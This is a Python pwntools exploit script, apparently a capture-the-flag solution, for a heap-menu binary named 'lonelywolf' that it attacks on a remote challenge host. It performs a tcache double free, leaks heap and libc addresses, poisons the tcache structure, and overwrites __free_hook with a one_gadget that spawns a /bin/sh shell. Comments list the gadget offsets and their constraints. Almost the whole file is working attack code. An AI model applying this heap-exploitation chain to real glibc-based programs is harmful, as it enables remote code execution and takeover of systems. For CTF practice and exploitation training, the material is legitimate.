from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


io=remote("node4.anna.nssctf.cn",28287)
# io=process("./lonelywolf")
elf=ELF("./lonelywolf")
libc=ELF("./libc-2.27.so")

def add(n,s):
    io.sendlineafter(b"choice: ",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Size: ",str(s))
    
def edit(n,cc):
    io.sendlineafter(b"choice: ",b"2")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Content: ",cc)

def show(n):
    io.sendlineafter(b"choice: ",b"3")
    io.sendlineafter(b"Index: ",str(n))
    
def delete(n):
    io.sendlineafter(b"choice: ",b"4")
    io.sendlineafter(b"Index: ",str(n))
    
# gdb.attach(io)
# pause()

add(0,0x78)
delete(0)
edit(0,p64(0)*2)
delete(0)
show(0)

io.recvuntil(b"Content: ")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x260
print("heap_addr: "+hex(heap_addr))

edit(0,p64(heap_addr+0x10))
add(0,0x78)
add(0,0x78)
edit(0,b"\x07"*0x40)

delete(0)
show(0)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x70-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))

malloc_hook=libc.sym[b"__malloc_hook"]+leak_addr
free_hook=libc.sym[b"__free_hook"]+leak_addr
one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=one_gadget[2]+leak_addr

payload=b"\x02"*0x40+p64(free_hook)

edit(0,payload)

add(0,0x10)
edit(0,p64(shell))

delete(0)

io.interactive()

# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL